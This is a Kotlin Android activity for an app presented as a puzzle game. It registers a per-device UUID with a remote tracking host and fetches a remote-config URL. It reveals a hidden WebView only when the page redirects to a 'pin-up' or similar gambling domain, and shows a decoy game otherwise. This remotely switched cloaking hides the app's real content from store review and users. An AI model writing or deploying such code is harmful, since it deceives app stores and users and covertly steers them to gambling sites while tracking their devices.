package com.puzzytigres.joguers

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Environment
import android.os.Parcelable
import android.provider.MediaStore
import android.view.View
import android.view.Window
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.onesignal.OneSignal
import com.puzzytigres.joguers.game.MyPlayGameActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.UUID

class LoadMainActivity: AppCompatActivity() {
    private var l = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
        setContentView(R.layout.load_main_activity)

        if (!OneSignal.Notifications.permission) {
            CoroutineScope(Dispatchers.IO).launch {
                OneSignal.Notifications.requestPermission(true)
            }
        }

        timer.start()
        createUUID()

        wv = findViewById(R.id.myView)
        wv!!.webViewClient = object :WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                l = url!!
                return super.shouldOverrideUrlLoading(view, url)
            }
        }
        wv!!.webChromeClient = Client()
        val ws = wv!!.settings
        ws.apply {
            javaScriptEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            domStorageEnabled = true
            databaseEnabled = true
            setSupportZoom(false)
            allowFileAccess = true
            allowContentAccess = true
        }
        if (savedInstanceState != null)
            wv!!.restoreState(savedInstanceState)
        wv!!.settings.apply {
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
    }

    private var gGuid = ""

    private val timer = object : CountDownTimer(2500, 1000) {
        override fun onTick(p0: Long) {
        }

        override fun onFinish() {
            getClass()
        }
    }

    private fun getClass() {
        try {

            val config = FirebaseRemoteConfig.getInstance()
            val def = mapOf(
                "sec" to ""
            )

            val settings = FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build()

            config.apply {
                setDefaultsAsync(def)
                setConfigSettingsAsync(settings)
                fetchAndActivate().addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        val sec: String = config.getString("sec")
                        if (sec.isEmpty() || sec.contains("play")) {
                            startActivity(
                                Intent(
                                    this@LoadMainActivity,
                                    MyPlayGameActivity::class.java
                                )
                            )
                        } else {
                            wv!!.loadUrl("$sec?id=$gGuid")
                            timerCheck.start()
                        }
                    }
                }
            }
        } catch (e: IOException) {
            startActivity(
                Intent(
                    this@LoadMainActivity,
                    MyPlayGameActivity::class.java
                )
            )
        }
    }

    private fun setVis() {
        wv!!.visibility = View.VISIBLE
        findViewById<ProgressBar>(R.id.progress).visibility = View.GONE
        findViewById<TextView>(R.id.loading).visibility = View.GONE
    }

    private val timerCheck = object : CountDownTimer(4000, 1000) {
        override fun onTick(p0: Long) {
        }

        override fun onFinish() {
            if (l == "https://play.google.com/store/apps/details?id=com.puzzytigres.joguers" ||
                    l.contains("play.google.com")) {
                startActivity(
                    Intent(
                        this@LoadMainActivity,
                        MyPlayGameActivity::class.java
                    )
                )
            } else if (l.contains("pin-up") ||
                l.contains("gopuptsd")) {
                setVis()
            } else {
                startActivity(
                    Intent(
                        this@LoadMainActivity,
                        MyPlayGameActivity::class.java
                    )
                )
            }
        }
    }

    private fun createUUID() {
        val guid = UUID.randomUUID()
        gGuid = guid.toString()
        exId(guid.toString(), "https://tigrespuzle.site/userid?id=")
    }

    private fun exId(uuid: String, path: String) {
        OneSignal.login(uuid, path)
    }

    private var mup: ValueCallback<Uri?>? = null
    private var mciu: Uri? = null
    private var mfpcb: ValueCallback<Array<Uri>>? = null
    private var mcpp: String? = null
    var wv: WebView? = null

    @Throws(IOException::class)
    private fun createImage(): File {
        // Create an image file name
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val ifn = "JPEG_" + ts + "_"
        val sd = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES
        )
        return File.createTempFile(
            ifn,  /* prefix */
            ".jpg",  /* suffix */
            sd /* directory */
        )
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        wv?.saveState(outState)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        wv?.restoreState(savedInstanceState)
    }

    override fun onBackPressed() {
        if (wv!!.canGoBack()) {
            wv!!.goBack()
        }
    }

    inner class Client : WebChromeClient() {
        override fun onShowFileChooser(
            view: WebView,
            filePath: ValueCallback<Array<Uri>>,
            fileChooserParams: FileChooserParams
        ): Boolean {
            if (mfpcb != null) {
                mfpcb!!.onReceiveValue(null)
            }
            mfpcb = filePath
            var tpi: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (tpi!!.resolveActivity(packageManager) != null) {
                var pf: File? = null
                try {
                    pf = createImage()
                    tpi.putExtra("PhotoPath", mcpp)
                } catch (ex: IOException) {
                }
                if (pf != null) {
                    mcpp = "file:" + pf.absolutePath
                    tpi.putExtra(
                        MediaStore.EXTRA_OUTPUT,
                        Uri.fromFile(pf)
                    )
                } else {
                    tpi = null
                }
            }
            val csi = Intent(Intent.ACTION_GET_CONTENT)
            csi.addCategory(Intent.CATEGORY_OPENABLE)
            csi.type = "image/*"
            val ia: Array<Intent?>
            ia = tpi?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val ci = Intent(Intent.ACTION_CHOOSER)
            ci.putExtra(Intent.EXTRA_INTENT, csi)
            ci.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            ci.putExtra(Intent.EXTRA_INITIAL_INTENTS, ia)
            startActivityForResult(ci, INPUT_FILE_REQUEST_CODE)
            return true
        }

        @JvmOverloads
        fun openFileChooser(uploadMsg: ValueCallback<Uri?>?, acceptType: String? = "") {
            mup = uploadMsg
            val isd = File(
                Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                ), "AndroidExampleFolder"
            )
            if (!isd.exists()) {
                isd.mkdirs()
            }

            val file = File(
                isd.toString() + File.separator + "IMG_"
                        + System.currentTimeMillis().toString() + ".jpg"
            )
            mciu = Uri.fromFile(file)
            val ci = Intent(
                MediaStore.ACTION_IMAGE_CAPTURE
            )
            ci.putExtra(MediaStore.EXTRA_OUTPUT, mciu)
            val i = Intent(Intent.ACTION_GET_CONTENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "image/*"
            val chi = Intent.createChooser(i, "Image Chooser")
            chi.putExtra(
                Intent.EXTRA_INITIAL_INTENTS, arrayOf<Parcelable>(ci)
            )
            startActivityForResult(chi, FILECHOOSER_RESULTCODE)
        }

        fun openFileChooser(
            uploadMsg: ValueCallback<Uri?>?,
            acceptType: String?,
            capture: String?
        ) {
            openFileChooser(uploadMsg, acceptType)
        }
    }

    public override fun onActivityResult(requestCode: Int, rc: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mfpcb == null) {
                super.onActivityResult(requestCode, rc, data)
                return
            }
            var rs: Array<Uri>? = null

            if (rc == RESULT_OK) {
                if (data == null) {
                    if (mcpp != null) {
                        rs = arrayOf(Uri.parse(mcpp))
                    }
                } else {
                    val ds = data.dataString
                    if (ds != null) {
                        rs = arrayOf(Uri.parse(ds))
                    }
                }
            }
            mfpcb!!.onReceiveValue(rs)
            mfpcb = null
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mup == null) {
                super.onActivityResult(requestCode, rc, data)
                return
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == mup) {
                    return
                }
                var result: Uri? = null
                try {
                    result = if (rc != RESULT_OK) {
                        null
                    } else {
                        if (data == null) mciu else data.data
                    }
                } catch (e: Exception) {
                    Toast.makeText(
                        applicationContext, "activity :$e",
                        Toast.LENGTH_LONG
                    ).show()
                }
                mup!!.onReceiveValue(result)
                mup = null
            }
        }
        return
    }

    companion object {
        private const val INPUT_FILE_REQUEST_CODE = 1
        private const val FILECHOOSER_RESULTCODE = 1
    }
}